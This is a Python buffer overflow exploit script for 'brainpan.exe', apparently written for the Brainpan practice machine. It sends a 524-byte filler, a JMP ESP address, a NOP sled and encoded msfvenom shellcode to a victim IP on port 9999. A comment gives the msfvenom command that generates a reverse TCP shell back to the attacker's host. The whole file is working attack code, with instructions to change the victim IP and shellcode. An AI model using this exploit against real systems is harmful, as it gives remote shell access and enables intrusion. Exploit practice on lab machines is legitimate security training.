#!/usr/bin/python3
import socket

"""
Buffer overflow exploit for brainpan.exe.

Be sure to generate your own shellcode and change the victim IP.
"""

# change these as necessary
victim_ip = "10.10.253.88"
victim_port = 9999

print("\nSending evil buffer...")

filler = b"A" * 524
eip = b"\xf3\x12\x17\x31" # JMP ESP in brainpan.exe
nops = b"\x90" * 10
# msfvenom -p linux/x86/shell_reverse_tcp LHOST=<attacker IP> LPORT=443 -e x86/shikata_ga_nai -b "\x00" -f py -v shellcode
shellcode =  b""
shellcode += b"\xb8\xa1\x76\x47\x32\xd9\xc1\xd9\x74\x24\xf4"
shellcode += b"\x5b\x31\xc9\xb1\x12\x31\x43\x12\x83\xc3\x04"
shellcode += b"\x03\xe2\x78\xa5\xc7\xd5\x5f\xde\xcb\x46\x23"
shellcode += b"\x72\x66\x6a\x2a\x95\xc6\x0c\xe1\xd6\xb4\x89"
shellcode += b"\x49\xe9\x77\xa9\xe3\x6f\x71\xc1\xf9\x89\x87"
shellcode += b"\x58\x96\x97\x87\x5b\xdd\x11\x66\xeb\x47\x72"
shellcode += b"\x38\x58\x3b\x71\x33\xbf\xf6\xf6\x11\x57\x67"
shellcode += b"\xd8\xe6\xcf\x1f\x09\x26\x6d\x89\xdc\xdb\x23"
shellcode += b"\x1a\x56\xfa\x73\x97\xa5\x7d"


buffer = filler + eip + nops + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((victim_ip, victim_port))
s.send(buffer)

s.close()

print("\nDone!")